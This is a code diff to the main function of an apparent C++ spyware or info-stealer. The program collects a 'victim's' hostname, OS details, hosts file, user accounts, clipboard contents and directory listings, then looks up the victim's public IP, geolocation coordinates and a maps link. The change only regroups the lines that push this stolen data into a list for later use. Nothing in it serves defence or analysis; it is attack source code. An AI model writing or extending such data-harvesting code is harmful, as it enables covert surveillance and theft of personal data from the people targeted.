@@ -14,7 +14,7 @@
 #include <X11/Xlib.h>
 
 // internal includes
-#include "headers/utils.h"
+#include "headers/headers.h"
 
 int main(int argc, char* argv[]) {
 
@@ -35,7 +35,6 @@ int main(int argc, char* argv[]) {
             << osHostname
             << "===============================================\n";
   
-  dataList.push_back(osHostname);
 
 
   std::string osInfos {System::getOsInfos()};
@@ -43,7 +42,6 @@ int main(int argc, char* argv[]) {
             << osInfos
             << "===============================================\n";
   
-  dataList.push_back(osInfos);
 
 
   std::string hostsInfos {System::getHostsFile()};
@@ -51,7 +49,6 @@ int main(int argc, char* argv[]) {
             << hostsInfos
             << "==============================================\n";
   
-  dataList.push_back(hostsInfos);
 
 
   std::string currentUserInfos {System::getCurrentUserInfos()};
@@ -59,7 +56,6 @@ int main(int argc, char* argv[]) {
             << currentUserInfos
             << "===============================================\n";
   
-  dataList.push_back(currentUserInfos);
 
 
   std::string allUsers {System::getAllUsers()};
@@ -67,7 +63,6 @@ int main(int argc, char* argv[]) {
             << allUsers
             << "===============================================\n";
   
-  dataList.push_back(allUsers);
 
 
   std::string clipboardContent {System::getClipboardContent()};
@@ -75,7 +70,6 @@ int main(int argc, char* argv[]) {
             << clipboardContent
             << "\n===============================================\n";
   
-  dataList.push_back(clipboardContent);
 
 
   std::cout << "\n=============MAIN DIRECTORIES CONTENT=============\n";
@@ -90,11 +84,9 @@ int main(int argc, char* argv[]) {
 
   std::string victimIP {OutsideTheBox::getVictimsIp(hnd)};
   
-  dataList.push_back(victimIP);
 
   std::string victimIPLocationInfos {OutsideTheBox::getVictimsIpLocationInfos(hnd, victimIP)};
   
-  dataList.push_back(victimIPLocationInfos);
 
   if (victimIP != "None") {
     std::cout << "Victim's IP : " << victimIP << "\n\n"; 
@@ -108,8 +100,6 @@ int main(int argc, char* argv[]) {
   std::vector<std::string> victimIPLocationLatLon {OutsideTheBox::getVictimsIpLatLon(victimIPLocationInfos)};
   std::string victimIPLocationLat {victimIPLocationLatLon[0]};
   std::string victimIPLocationLon {victimIPLocationLatLon[1]};
-  dataList.push_back(victimIPLocationLat);
-  dataList.push_back(victimIPLocationLon);
 
   for (int o {0}; o < victimIPLocationLatLon.size(); o++) {
     std::cout << "victimIPLocationLatLon[" << o << "] : " << victimIPLocationLatLon[o] << '\n';
@@ -118,6 +108,17 @@ int main(int argc, char* argv[]) {
   std::cout << "victimIPLocationLon : " << victimIPLocationLon << '\n';
   
   std::string victimIPLocationMaps {OutsideTheBox::getVictimsIpLocationMaps(victimIPLocationLat, victimIPLocationLon)};
+  
+  dataList.push_back(osHostname);
+  dataList.push_back(osInfos);
+  dataList.push_back(hostsInfos);
+  dataList.push_back(currentUserInfos);
+  dataList.push_back(allUsers);
+  dataList.push_back(clipboardContent);
+  dataList.push_back(victimIP);
+  dataList.push_back(victimIPLocationInfos);
+  dataList.push_back(victimIPLocationLat);
+  dataList.push_back(victimIPLocationLon);
   dataList.push_back(victimIPLocationMaps);
   
   std::cout << "\n\n  -> " <<  victimIPLocationMaps << std::endl;
